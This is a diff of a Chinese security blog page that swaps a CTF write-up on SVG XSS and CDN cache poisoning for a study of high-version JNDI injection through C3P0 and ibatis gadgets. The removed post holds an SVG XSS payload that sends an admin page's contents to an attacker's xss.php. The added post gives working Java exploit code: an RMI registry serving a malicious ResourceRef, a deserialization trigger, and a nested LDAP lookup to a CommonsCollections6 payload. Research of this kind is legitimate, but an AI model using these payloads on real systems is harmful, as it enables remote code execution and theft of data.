@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>SVG XSS-CDN-Web缓存投毒 - Twings</title>
+  <title>高版本下的JNDI注入学习 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期四, 四月 4日 2019, 10:15 晚上
+                  星期四, 三月 13日 2025, 4:29 下午
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    958 字
+                    1.2k 字
                   </span>
                 
 
@@ -134,7 +134,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      4 分钟
+                      6 分钟
                   </span>
                 
 
@@ -169,70 +169,195 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好长一段时间之前看到的一篇文章和一道题，结果我一直干别的事情，都没有好好研究一下，现在赶紧补一下坑，写篇文章总结记录一哈。</p>
-<p>题目的预期解是SVG XSS，而非预期解是缓存投毒。</p>
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习，类似Tomcat依赖环境下的利用方式，这次学习的是C3P0依赖环境下的利用方式，算是一种拓展攻击面吧。</p>
+<p>类似Tomcat环境下的BeanFactory可以调用一个public方法，该环境中的JavaBeanObjectFactory可以调用setter。</p>
+<p>此外还需要一个环境ibatis-sqlmap下面的JtaTransactionConfig类，用于嵌套多一层JNDI。</p>
 <a id="more"></a>
 <hr>
-<h3 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h3><p>题目链接：<a href="http://web50.zajebistyc.tf/" target="_blank" rel="noopener">http://web50.zajebistyc.tf/</a></p>
-<p>writeup：<a href="https://xz.aliyun.com/t/4492#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492#toc-2</a></p>
-<p>SVG XSS：<a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/85.html</a></p>
-<p>payload：</p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;
-&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;
-&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;
-    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;
-&lt;script&gt;
-    var xmlhttp = new XMLHttpRequest();
-    var response;
-    xmlhttp.onreadystatechange = function() {
-        if (4 == xmlhttp.readyState) {
-            if (200 == xmlhttp.status) {
-                location.href=&#39;https://*.*.*.*/xss.php?&#39;+btoa(xmlhttp.responseText);
-            }
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>两个依赖：</p>
+<pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;
+&lt;dependency&gt;
+  &lt;groupId&gt;com.mchange&lt;/groupId&gt;
+  &lt;artifactId&gt;c3p0&lt;/artifactId&gt;
+  &lt;version&gt;0.10.2&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!-- https://mvnrepository.com/artifact/org.apache.ibatis/ibatis-sqlmap --&gt;
+&lt;dependency&gt;
+  &lt;groupId&gt;org.apache.ibatis&lt;/groupId&gt;
+  &lt;artifactId&gt;ibatis-sqlmap&lt;/artifactId&gt;
+  &lt;version&gt;2.3.4.726&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h3 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h3><p>回忆一下，本地Factory要满足的两个条件：</p>
+<ul>
+<li>继承ObjectFactory</li>
+<li>存在getObjectInstance方法</li>
+</ul>
+<p>然后就可以调用它的getObjectInstance函数。</p>
+<p>而C3P0JavaBeanObjectFactory继承自JavaBeanObjectFactory类，其getObjectInstance函数如下：</p>
+<pre><code class="java">public Object getObjectInstance(Object refObj, Name name, Context nameCtx, Hashtable env)
+throws Exception {
+  if (refObj instanceof Reference) {
+    Reference ref = (Reference) refObj;
+    Map refAddrsMap = new HashMap();
+    for (Enumeration e = ref.getAll(); e.hasMoreElements(); ) {
+      RefAddr addr = (RefAddr) e.nextElement();
+      refAddrsMap.put( addr.getType(), addr );
+    }
+    Class beanClass = Class.forName( ref.getClassName() );
+    Set refProps = null;
+    RefAddr refPropsRefAddr = (BinaryRefAddr) refAddrsMap.remove( JavaBeanReferenceMaker.REF_PROPS_KEY );
+    if ( refPropsRefAddr != null )
+        refProps = (Set) SerializableUtils.fromByteArray( (byte[]) refPropsRefAddr.getContent() );
+    Map propMap = createPropertyMap( beanClass, refAddrsMap );
+    return findBean( beanClass, propMap, refProps );
+  }
+  else
+      return null;
+}
+</code></pre>
+<p>可以看到非常令人激动的函数名称findBean，这个getObjectInstance函数的逻辑看起来就是从ref对象里面取出类名和属性名，再进入findBean函数进行实例化和反射赋值。</p>
+<p>再看看这个findBean函数：</p>
+<pre><code class="java">protected Object findBean(Class beanClass, Map propertyMap, Set refProps ) throws Exception {
+  Object bean = createBlankInstance( beanClass );
+  BeanInfo bi = Introspector.getBeanInfo( bean.getClass() );
+  PropertyDescriptor[] pds = bi.getPropertyDescriptors();
+
+  for (int i = 0, len = pds.length; i &lt; len; ++i) {
+    PropertyDescriptor pd = pds[i];
+    String propertyName = pd.getName();
+    Object value = propertyMap.get( propertyName );
+    Method setter = pd.getWriteMethod();
+    if (value != null) {
+      if (setter != null)
+          setter.invoke( bean, new Object[] { (value == NULL_TOKEN ? null : value) } );
+      else {
+        ...
+      }
+    }
+    ...
+  }
+
+  return bean;
+}
+</code></pre>
+<p>可以看到createBlankInstance先创建了一个空白的对象：</p>
+<pre><code class="java">protected Object createBlankInstance(Class beanClass) throws Exception
+{ return beanClass.newInstance(); }
+</code></pre>
+<p>再调用setter，由于setter是按顺序调用的，因此可能导致利用的时候发生一些错误，比如参考文章里调用JdbcRowSetImpl的setter时就因为顺序问题导致发起JNDI连接失败。</p>
+<p>发现ResourceRef类无法引入，看起来需要在pom.xml中引入一下Tomcat依赖：</p>
+<pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;
+    &lt;version&gt;10.1.39&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>结果发现版本有问题，Tomcat10不能在Java8运行，只能删掉改成从磁盘上的Tomcat引入jar包了。</p>
+<p>写一个Test.java用于测试setter调用：</p>
+<pre><code class="java">package org.example;
+
+public class Test {
+    private String data;
+
+    public void setData(String data) {
+        this.data = data;
+        System.out.println(data);
+    }
+
+    public String getData() {
+        return data;
+    }
+}
+</code></pre>
+<p>搭建一下RMI服务端：</p>
+<pre><code class="java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+
+import javax.naming.StringRefAddr;
+import java.io.IOException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import org.apache.naming.ResourceRef;
+
+public class App 
+{
+    public static void main( String[] args ) {
+        try {
+            Registry registry = LocateRegistry.createRegistry(8888);
+            ResourceRef resourceRef = c3p0();
+            ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef);
+            registry.bind(&quot;c3p0&quot;, referenceWrapper);
+        }catch (Exception e) {
+            e.printStackTrace();
         }
-    };
-    xmlhttp.open(&quot;GET&quot;, &quot;/profile/admin&quot;);
-    xmlhttp.send();
-&lt;/script&gt;
-&lt;/svg&gt;
-</code></pre><p>正解就随便一题带过。</p>
+        System.out.println(&quot;Registry运行中......&quot;);
+    }
+
+    private static ResourceRef c3p0() throws IOException {
+        ResourceRef ref = new ResourceRef(&quot;org.example.Test&quot;,null,&quot;&quot;,&quot;&quot;,true,
+                &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;,null);
+        ref.add(new StringRefAddr(&quot;data&quot;, &quot;Hello, World!&quot;));
+        return ref;
+    }
+}
+</code></pre>
+<p>再启动客户端去连接，在实际应用中，这一步可以通过Fastjson反序列化、JNDI注入等方式来实现：</p>
+<pre><code class="java">package org.example;
+
+import javax.naming.InitialContext;
+
+public class Client {
+    public static void main(String[] args) {
+        try {
+            String string = &quot;rmi://localhost:8888/c3p0&quot;;
+            InitialContext initialContext = new InitialContext();
+            initialContext.lookup(string);
+        }catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+</code></pre>
+<p>启动，看到setter正常触发了：</p>
+<pre><code>三月 13, 2025 10:08:28 上午 com.mchange.v2.log.MLog 
+信息: MLog clients using java 1.4+ standard logging.
+三月 13, 2025 10:08:28 上午 com.mchange.v2.naming.JavaBeanObjectFactory 
+警告: com.mchange.v2.naming.JavaBeanObjectFactory -- RefAddr for unknown property: singleton
+三月 13, 2025 10:08:28 上午 com.mchange.v2.naming.JavaBeanObjectFactory 
+警告: com.mchange.v2.naming.JavaBeanObjectFactory -- RefAddr for unknown property: auth
+三月 13, 2025 10:08:28 上午 com.mchange.v2.naming.JavaBeanObjectFactory 
+警告: com.mchange.v2.naming.JavaBeanObjectFactory -- RefAddr for unknown property: scope
+Hello, World!
+</code></pre><p>通过C3P0依赖，可以按顺序调用setter，一般情况下不会有什么未初始化问题。</p>
+<h3 id="WrapperConnectionPoolDataSource"><a href="#WrapperConnectionPoolDataSource" class="headerlink" title="WrapperConnectionPoolDataSource"></a>WrapperConnectionPoolDataSource</h3><p>用于开启一个字节流反序列化点，不过JNDI使用LDAP好像就有反序列化功能了。</p>
+<p>通过setUserOverridesAsString可以触发反序列化：</p>
+<pre><code class="java">private static ResourceRef c3p0() throws IOException {
+    ResourceRef ref = new ResourceRef(&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,null,&quot;&quot;,&quot;&quot;,true,
+            &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;,null);
+    ref.add(new StringRefAddr(&quot;userOverridesAsString&quot;, &quot;Hello, World!&quot;));
+    return ref;
+}
+</code></pre>
+<h3 id="JtaTransactionConfig"><a href="#JtaTransactionConfig" class="headerlink" title="JtaTransactionConfig"></a>JtaTransactionConfig</h3><p>用于嵌套多一层JNDI，应用面可能比较窄。</p>
+<p>参考文章：</p>
+<pre><code class="java">private static ResourceRef jndi() throws IOException {
+    ResourceRef ref = new ResourceRef(&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;com.mchange.v2.naming.JavaBeanObjectFactory&quot;, null);
+    Properties properties = new Properties();
+    properties.put(&quot;UserTransaction&quot;, &quot;ldap://127.0.0.1:1389/deserialCommonsCollections6&quot;);
+    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+    objectOutputStream.writeObject(properties);
+    byte [] bytes = byteArrayOutputStream.toByteArray();
+    ref.add(new BinaryRefAddr(&quot;properties&quot;, bytes));
+    return ref;
+}
+</code></pre>
+<p>由于setProperties方法需要的参数properties类型为Properties，因此不能使用StringRefAddr，需要使用RefAddr的另一个实现类BinaryRefAddr。</p>
 <hr>
-<h3 id="缓存投毒"><a href="#缓存投毒" class="headerlink" title="缓存投毒"></a>缓存投毒</h3><p>writeup：<a href="https://ctftime.org/writeup/13925" target="_blank" rel="noopener">https://ctftime.org/writeup/13925</a></p>
-<p>Web缓存投毒：<a href="https://www.anquanke.com/post/id/156356" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156356</a></p>
-<p>原理就是利用CDN缓存，攻击者在CDN上缓存一个恶意的静态资源，如果受害人HIT了这个资源，就会受到攻击。</p>
-<p>在这道题目里面，按照题目的配置Vary: Accept-Encoding, Cookie，按理来说由于请求头中Cookie的不同，admin应该是无法命中缓存的才对，但是尝试过后我们会发现，Cookie似乎没有起到作用？</p>
-<p>尝试更多之后我发现，手机上的微信浏览器却不会命中缓存。</p>
-<p>我对微信浏览器进行抓包的时候，它又命中了缓存：</p>
-<p><img src="/css/images/CDN/2019040401.png" srcset="/img/loading.gif" alt=""></p>
-<p>似乎它的CDN跟别的不一样。</p>
-<p>后来我进行了Google，看到了这些文章：</p>
-<p><a href="https://blog.stackpath.com/accept-encoding-vary-important" target="_blank" rel="noopener">https://blog.stackpath.com/accept-encoding-vary-important</a></p>
-<p><a href="https://cdnsun.com/knowledgebase/cdn-static/setting-a-set-cookie-ignore-or-accept" target="_blank" rel="noopener">https://cdnsun.com/knowledgebase/cdn-static/setting-a-set-cookie-ignore-or-accept</a></p>
-<p><a href="https://www.maxcdn.com/one/tutorial/use-cdn-with-cookie-set-sent-from-origin/" target="_blank" rel="noopener">https://www.maxcdn.com/one/tutorial/use-cdn-with-cookie-set-sent-from-origin/</a></p>
-<p><a href="https://www.maxcdn.com/one/tutorial/how-to-use-cdn-with-cloudflare/" target="_blank" rel="noopener">https://www.maxcdn.com/one/tutorial/how-to-use-cdn-with-cloudflare/</a></p>
-<p>可以看到，cloudflare是不会缓存带有set-cookie头的资源的，而当我们在服务器上进行尝试的时候，可以发现CDN缓存了我们的请求：</p>
-<p><img src="/css/images/CDN/2019040402.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040403.png" srcset="/img/loading.gif" alt=""></p>
-<p>这看起来像是出题人自己开启了Strip All Cookies选项，所以Cookie就没有作用了。</p>
-<p>那微信浏览器又是什么情况呢？难道是Accept-Encoding的原因？但是抓到的包看起来跟chrome没有什么差别耶。</p>
-<hr>
-<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>既然这样，那我就自己整一个CDN来玩玩吧，我使用的是腾讯云的CDN服务，参考的文章：<a href="https://www.boyhost.cn/otherfree/apply-qcloud-free-cdn-deploy.html" target="_blank" rel="noopener">https://www.boyhost.cn/otherfree/apply-qcloud-free-cdn-deploy.html</a> 。</p>
-<p>首先在腾讯云开通CDN服务，按流量计费还是比较便宜的，况且还会赠送几个月50G的流量包：</p>
-<p><img src="/css/images/CDN/2019040501.png" srcset="/img/loading.gif" alt=""></p>
-<p>然后根据他的提示配置好，我这里为了方便测试所以缓存了.php后缀XD，这么干肯定是不对的：</p>
-<p><img src="/css/images/CDN/2019040502.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040503.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040504.png" srcset="/img/loading.gif" alt=""></p>
-<p>因为我的源站是HTTPS的缘故，所以我还要申请多一个证书给这个域名和配置DNS解析：</p>
-<p><img src="/css/images/CDN/2019040505.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040506.png" srcset="/img/loading.gif" alt=""></p>
-<p><img src="/css/images/CDN/2019040507.png" srcset="/img/loading.gif" alt=""></p>
-<p>然后我们就可以开启愉快的CDN之旅了~</p>
-<p>写个输出HTTP头信息的PHP来进行测试，最后通过不停的强制刷新我发现，会有多个不同的IP去访问我的VPS，如果在缓存的时间内两个请求被调度到同一个节点，就会命中相同的缓存，就像腾讯云官方所说：</p>
-<p><img src="/css/images/CDN/2019040508.png" srcset="/img/loading.gif" alt=""></p>
-<p>具体的调度算法我也摸不清楚，大概cloudflare也是类似的构造，所以导致了微信浏览器的特殊情况吧？</p>
-<hr>
-<p>Orz</p>
+<p><a href="https://forum.butian.net/share/4142" target="_blank" rel="noopener">高版本 jndi 调用 setter 方法拓展攻击面</a></p>
 
             </div>
             <hr>
@@ -243,11 +368,11 @@
                   <span>
                 <i class="iconfont icon-tag"></i>
                     
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
                       <a class="hover-with-bg" href="/tags/Web/">Web</a>
                     
-                      <a class="hover-with-bg" href="/tags/前端/">前端</a>
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/JNDI/">JNDI</a>
                     
                   </span>
                 
@@ -259,16 +384,16 @@
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2019/04/07/西湖论剑Web/">
+                      <a href="/2025/03/14/CVE-2025-24813 Apache Tomcat远程代码执行漏洞/">
                         <i class="fa fa-chevron-left"></i>
-                        <span>西湖论剑Web</span>
+                        <span>CVE-2025-24813 Apache Tomcat远程代码执行漏洞</span>
                       </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2019/04/04/Go-1/">
-                        <span>Go(1)</span>
+                      <a href="/2025/03/10/struts文件上传漏洞复现2/">
+                        <span>CVE-2024-53677(S2-067)学习</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -441,7 +566,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "SVG XSS-CDN-Web缓存投毒&nbsp;",
+        "高版本下的JNDI注入学习&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
